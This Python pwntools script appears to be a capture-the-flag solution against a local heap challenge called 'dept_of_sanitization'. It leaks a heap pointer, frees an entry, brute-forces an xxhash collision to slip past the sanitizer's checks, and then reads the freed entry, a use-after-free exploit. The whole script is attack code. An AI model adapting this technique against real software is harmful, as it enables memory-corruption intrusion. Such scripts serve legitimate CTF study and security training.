from pwn import *

#p = process('./dept_of_sanitization')
p = remote('localhost', 5454)

cnt = 0

def do_leak(msglen):
    global cnt
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('): ')
    p.send('A'*32)
    p.sendline('B'*msglen)

    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('): ')
    p.sendline(str(cnt))

    cnt += 1

    stuff = p.recvuntil('Dept of San')
    return u64(stuff.split(b'A'*32)[1].split(b'\nDescription')[0].ljust(8, b'\x00'))

heap_leak = do_leak(32)
print("HEAP", hex(heap_leak))

# free 0
p.recvuntil('choice: ')
p.sendline('3')
p.recvuntil('): ')
p.sendline('0')

# # verify reading 0 crashses
# p.recvuntil('choice: ')
# p.sendline('2')
# p.recvuntil('): ')
# p.sendline('0')
#
# print(p.recvuntil('choice: '))
#
# assert False

MOD = 128 * 1024

import xxhash
leak_hash = xxhash.xxh64(p64(heap_leak)).intdigest() % MOD
addr = heap_leak + 8
while True:
    if xxhash.xxh64(p64(addr)).intdigest() % MOD == leak_hash:
        break
    addr += 8

collision = addr
print('collision', hex(collision))
remain = collision - heap_leak
print('need to consume', remain)

while remain > 4096:
    last = do_leak(min(2048, remain))
    remain = collision - last

print('last', hex(last))
print('remain', hex(remain))
for _ in range(5):
    last = do_leak(1)
    print('last', hex(last))
    remain = collision - last

print('align', hex(do_leak(remain % 0x18)))

while remain > 0:
    last = do_leak(1)
    print('last', hex(last))
    if last == collision:
        print('got collision')
        break
    if last > heap_leak:
        remain = collision - last
else:
    assert False, "hmm"

p.recvuntil('choice: ')
p.sendline('2')
p.recvuntil('): ')
p.sendline('0')

print(p.recvuntil('choice: '))
